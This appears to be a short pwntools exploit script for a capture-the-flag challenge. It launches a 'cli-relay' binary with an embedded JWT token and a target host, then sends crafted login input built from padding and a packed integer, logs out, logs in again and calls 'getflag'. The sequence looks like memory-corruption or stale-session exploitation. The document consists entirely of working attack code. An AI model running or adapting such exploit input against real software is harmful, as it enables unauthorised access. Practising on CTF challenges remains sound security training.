from pwn import *


p = process(["./cli-relay", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkYW1AZ2VlZ2xlLm9yZyIsInNlcnZpY2UiOiJ1YmVycHJveHlAc2VydmljZXMuZ2VlZ2xlLm9yZyIsImV4cCI6MTU3NDYyOTI4OH0.7sEEZmT7tPkw1jlSJwKqsXn6H8cUNKTGdLbOWV2Q_Gk", "shell.corp.geegle.org"])

p.sendline("login AAAABBBB" + p32(9) + "DDDD")
p.sendline("logout")
p.sendline("login A")
p.sendline("getflag")
p.interactive()

